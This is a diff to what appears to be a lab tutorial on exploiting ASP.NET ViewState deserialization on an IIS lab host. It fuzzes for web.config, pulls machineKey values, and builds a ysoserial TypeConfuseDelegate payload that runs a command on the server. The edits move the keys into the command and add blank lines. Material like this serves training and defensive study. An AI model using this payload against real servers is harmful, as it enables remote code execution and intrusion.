@@ -43,10 +43,15 @@ ffuf -u http://iis.lab/main/FUZZ -w wordlist.txt
 
 Once you have `web.config`, locate these values:
 
+
+
+
+
+
 ```xml
 <machineKey
-  validationKey="CB2721ABDAF8E9DC516D621D8B8BF13A2C9E868FEA8B4F7D8C8F8F8F8F8F8F8F"
-  decryptionKey="ABCD1234567890ABCD1234567890ABCD"
+  validationKey="KEY"
+  decryptionKey="KEY"
   validation="SHA1"
   decryption="AES" />
 ```
@@ -69,8 +74,15 @@ The generator (VIEWSTATEGENERATOR) is a page-specific identifier. Get it from th
 
 Use ysoserial to craft a ViewState payload that executes a command:
 
+
+
+<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="" />
+
+
+
+
 ```powershell
-.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=<KEY> —decryptionkey=<KEY> --validationalg="SHA1" --decryptionalg="AES" --generator=<KEY> --path="/main/home.aspx" --apppath="/main/"
+.\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd.exe /c whoami > C:\Windows\Temp\pwned.txt" --validationkey=CB2721ABDAF8E9DC516D621D8B8BF13A2C9E868FEA8B4F7D8C8F8F8F8F8F8F8F —decryptionkey=ABCD1234567890ABCD1234567890ABCD --validationalg="SHA1" --decryptionalg="AES" --generator=9EB1435B --path="/main/home.aspx" --apppath="/main/"
 ```
 
 **Parameters explained:**
